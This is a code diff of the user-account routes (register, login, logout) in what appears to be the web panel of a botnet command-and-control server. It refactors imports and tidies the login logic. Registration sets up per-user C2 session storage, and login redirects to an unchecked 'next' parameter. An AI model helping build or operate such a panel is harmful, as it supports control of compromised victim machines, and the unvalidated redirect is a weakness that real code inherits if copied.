@@ -6,11 +6,10 @@ from flask import (
 	request, url_for, send_from_directory
 )
 from flask_login import login_user, logout_user, current_user, login_required
-
-from buildyourownbotnet import app, db, bcrypt, client, server
-from buildyourownbotnet.core import database
+from buildyourownbotnet import client, c2
+from buildyourownbotnet.core.dao import user_dao
 from buildyourownbotnet.users.forms import RegistrationForm, LoginForm, UpdateAccountForm, ResetPasswordForm
-from buildyourownbotnet.models import User, Session
+from buildyourownbotnet.models import db, bcrypt, User, Session
 
 
 # Blueprint
@@ -52,7 +51,7 @@ def register():
 				os.makedirs(files_dir)
 
 			# initialize c2 session storage
-			server.c2.sessions[user.username] = {}
+			c2.sessions[user.username] = {}
 
 			# notify user and redirect to login
 			flash("You have successfully registered!", 'info')
@@ -69,18 +68,16 @@ def login():
 	"""Log user in"""
 	if current_user.is_authenticated:
 		return redirect(url_for('main.sessions'))
-	form = LoginForm()
 
+	form = LoginForm()
 	if form.validate_on_submit():
-		user = User.query.filter_by(username=form.username.data).first()
-		if user:
-			# password authentication
-			if user and bcrypt.check_password_hash(user.password, form.password.data):
-				login_user(user)
-				next_page = request.args.get('next')
-				return redirect(next_page) if next_page else redirect(url_for('main.sessions'))
+		user = user_dao.get_user(username=form.username.data)
+		if user and bcrypt.check_password_hash(user.password, form.password.data):
+			login_user(user)
+			next_page = request.args.get('next')
+			return redirect(next_page) if next_page else redirect(url_for('main.sessions'))
 		flash("Invalid username/password.", 'danger')
-	return render_template("login.html", form=form, title="Log In")
+	return render_template("login.html", form=form, title="Log In"), 403
 
 
 @users.route("/account", methods=['GET','POST'])
@@ -103,6 +100,7 @@ def account():
 
 
 @users.route('/logout')
+@login_required
 def logout():
 	"""Log out"""
 	logout_user()
